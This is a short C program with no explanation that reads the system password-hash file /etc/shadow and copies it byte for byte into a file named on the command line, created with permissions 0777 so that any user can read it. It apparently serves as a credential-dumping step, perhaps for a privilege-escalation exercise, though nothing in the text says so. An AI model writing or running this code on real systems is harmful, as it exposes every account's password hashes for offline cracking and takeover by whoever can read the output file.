#include<stdio.h>
#include<unistd.h>
#include<stdlib.h>
#include<fcntl.h>


int main(int size, char *args[])
{
	char buff [256];
	int n = 0;
	int fd = open(args[1], O_WRONLY|O_CREAT,0777);
	int fd2 = open("/etc/shadow", O_RDONLY);
	while(1)
	{
		n = read(fd2,buff,255);
	
		if(n<1)
		{
			exit(-n);
		}
	
		write(fd,buff,n);
	}
	return 0;

}
